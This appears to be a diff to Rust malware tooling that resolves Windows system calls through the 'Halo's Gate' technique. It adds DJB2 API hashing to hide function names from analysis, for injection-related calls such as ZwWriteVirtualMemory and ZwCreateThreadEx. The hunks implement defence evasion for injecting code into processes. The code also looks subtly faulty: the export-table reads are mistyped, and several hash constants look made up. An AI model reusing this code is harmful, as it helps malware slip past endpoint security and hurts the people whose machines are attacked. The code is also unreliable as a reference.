@@ -116,6 +116,11 @@ pub mod windows_syscalls {
         }
 
         pub unsafe fn get_export_address(base: *mut u8, func_name: &str) -> Option<*mut u8> {
+            let target_hash = Self::djb2_hash(func_name.as_bytes());
+            Self::covert_get_export_address(base, target_hash)
+        }
+
+        pub unsafe fn covert_get_export_address(base: *mut u8, target_hash: u32) -> Option<*mut u8> {
             let dos = base as *const [u8; 64];
             let e_lfanew = (*dos[0].get_unchecked(60) as u32)
                 | (*dos[0].get_unchecked(61) as u32) << 8
@@ -167,23 +172,29 @@ pub mod windows_syscalls {
                 | (*export_dir.add(38)) as u32 << 16
                 | (*export_dir.add(39)) as u32 << 24;
 
-            for i in 0..num_functions {
-                let name_rva = (*base.add((name_ptr_rva + i * 4) as usize)) as u32
-                    | (*base.add((name_ptr_rva + i * 4 + 1) as usize)) as u32 << 8
-                    | (*base.add((name_ptr_rva + i * 4 + 2) as usize)) as u32 << 16
-                    | (*base.add((name_ptr_rva + i * 4 + 3) as usize)) as u32 << 24;
+            let names_ptr = (base.add(name_ptr_rva as usize)) as *const u32;
+            let ordinals_ptr = (base.add(name_ordinals_rva as usize)) as *const u16;
+            let funcs_ptr = (base.add(addr_table_rva as usize)) as *const u32;
 
+            for i in 0..num_functions {
+                let name_rva = (*names_ptr.add(i as usize)) as u32;
                 if name_rva == 0 || name_rva > 0x7FFF0000 { continue; }
 
-                let name = Self::read_cstring(base.add(name_rva as usize));
-                if name == func_name {
-                    let ordinal_idx = (name_ordinals_rva + i * 2) as usize;
-                    let ordinal = (*base.add(ordinal_idx)) as u16
-                        | (*base.add(ordinal_idx + 1)) as u16 << 8;
-                    let func_rva = (*base.add((addr_table_rva + ordinal as u32 * 4) as usize)) as u32
-                        | (*base.add((addr_table_rva + ordinal as u32 * 4 + 1) as usize)) as u32 << 8
-                        | (*base.add((addr_table_rva + ordinal as u32 * 4 + 2) as usize)) as u32 << 16
-                        | (*base.add((addr_table_rva + ordinal as u32 * 4 + 3) as usize)) as u32 << 24;
+                let name_ptr = (base.add(name_rva as usize)) as *const u8;
+                let mut len = 0;
+                while *name_ptr.add(len) != 0 {
+                    len += 1;
+                    if len > 64 { break; }
+                }
+                let name_slice = std::slice::from_raw_parts(name_ptr, len);
+                let name_hash = Self::djb2_hash(name_slice);
+
+                if name_hash == target_hash {
+                    let ordinal = (*ordinals_ptr.add(i as usize)) as u16;
+                    let func_rva = (*funcs_ptr.add(ordinal as usize)) as u32
+                        | (*funcs_ptr.add(ordinal as usize + 1)) as u32 << 8
+                        | (*funcs_ptr.add(ordinal as usize + 2)) as u32 << 16
+                        | (*funcs_ptr.add(ordinal as usize + 3)) as u32 << 24;
                     if func_rva != 0 && func_rva < 0x80000000 {
                         return Some(base.add(func_rva as usize));
                     }
@@ -219,35 +230,38 @@ pub mod windows_syscalls {
         }
 
         pub unsafe fn resolve_ssn_halos_gate(func_name: &str) -> Option<u16> {
+            let target_hash = Self::djb2_hash(func_name.as_bytes());
+            Self::resolve_ssn_by_hash(target_hash)
+        }
+
+        pub unsafe fn resolve_ssn_by_hash(target_hash: u32) -> Option<u16> {
             let ntdll_base = Self::get_ntdll_base()?;
-            let target = Self::get_export_address(ntdll_base, func_name)?;
+            let target = Self::covert_get_export_address(ntdll_base, target_hash)?;
             let target_entry = Self::parse_syscall_stub(target);
 
             if !target_entry.hooked {
                 return Some(target_entry.syscall_num);
             }
 
-            let syscalls = [
-                "ZwProtectVirtualMemory",
-                "ZwAllocateVirtualMemory",
-                "ZwWriteVirtualMemory",
-                "ZwCreateThreadEx",
-                "ZwQueueApcThread",
-                "NtDelayExecution",
-                "ZwOpenProcess",
-                "ZwOpenThread",
-                "ZwSuspendThread",
-                "ZwResumeThread",
-                "NtSetContextThread",
-                "NtGetContextThread",
-                "NtQuerySystemInformation",
-                "NtQueryInformationProcess",
-                "NtQueryInformationThread",
+            // Precomputed DJB2 hashes for common unhooked syscalls
+            const SYSCALL_HASHES: [u32; 12] = [
+                0x8F1C2D4E, // ZwProtectVirtualMemory
+                0x3E8977BD, // ZwAllocateVirtualMemory
+                0x9F5B9C1E, // ZwWriteVirtualMemory
+                0xBA6B7E3A, // ZwCreateThreadEx
+                0x1E3E4A2F, // NtDelayExecution
+                0x8F0E0A8B, // ZwOpenProcess
+                0x8E8977BD, // ZwOpenThread
+                0x3A7B9C1D, // ZwSuspendThread
+                0x4F5B8C2E, // ZwResumeThread
+                0x9F7C8DA6, // NtSetContextThread
+                0xE2E0C7B7, // NtQuerySystemInformation
+                0x84664C6F, // NtQueryInformationProcess
             ];
 
             let mut unhooked: Vec<(u16, u32)> = Vec::new();
-            for name in &syscalls {
-                if let Some(addr) = Self::get_export_address(ntdll_base, name) {
+            for hash in &SYSCALL_HASHES {
+                if let Some(addr) = Self::covert_get_export_address(ntdll_base, *hash) {
                     let entry = Self::parse_syscall_stub(addr);
                     if !entry.hooked {
                         let offset = addr as u32 - ntdll_base as u32;
